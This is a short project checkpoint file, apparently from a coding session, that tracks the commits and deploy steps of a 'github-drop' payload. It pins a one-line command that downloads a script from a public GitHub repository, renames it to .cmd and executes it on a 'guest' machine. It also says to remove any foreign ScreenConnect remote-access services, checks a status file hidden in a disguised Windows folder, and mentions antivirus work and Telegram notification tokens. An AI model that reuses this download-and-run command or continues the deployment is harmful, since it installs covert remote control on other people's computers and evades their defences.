# CHECKPOINT — 2026-08-01

## Flatten note
All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` nested local repo).

## Saved state (this session)
- **github-drop / Project** — branch `main` @ **`16c35a7`**
- Working tree clean after save
- **WindowsPin** — local `master` @ **`41335fc`** (no remote; ignored by parent `.gitignore`)
- Keep FPs: `5f6010579852e507` + `f861c8140d453427`
- Do **not** commit live Telegram tokens as `notify.json` to public repo

## Current deploy
- **own.cmd O3** — payload lineage `1eae94c` / save `2d9549a`; flatten bookkeeping `04ed579`
- Order: ensure primary RUNNING, then nuke foreign SC

## Preferred Guest command (pinned SHA)
```
curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/04ed579/own.txt" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
```

## After detach — wait ~60s then verify
```
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
```

## Related saves
- github-drop save before flatten: `2d9549a`
- Flatten into Desktop/Project: `04ed579`
- Ignore WindowsPin noise + checkpoint: `3f944a9`
- This save: `16c35a7`
- WindowsPin local saves: `4682ccf` → `41335fc`

## Key paths
| What | Path |
|------|------|
| Project root (drop + tools) | `C:\Users\nobuddy\Desktop\Project\` |
| Windows Pin source | `C:\Users\nobuddy\Desktop\Project\WindowsPin\` |
| Public drop | https://github.com/xnobuddy/github-drop |

## Next
Continue from user request (UI fidelity / AV / deploy).
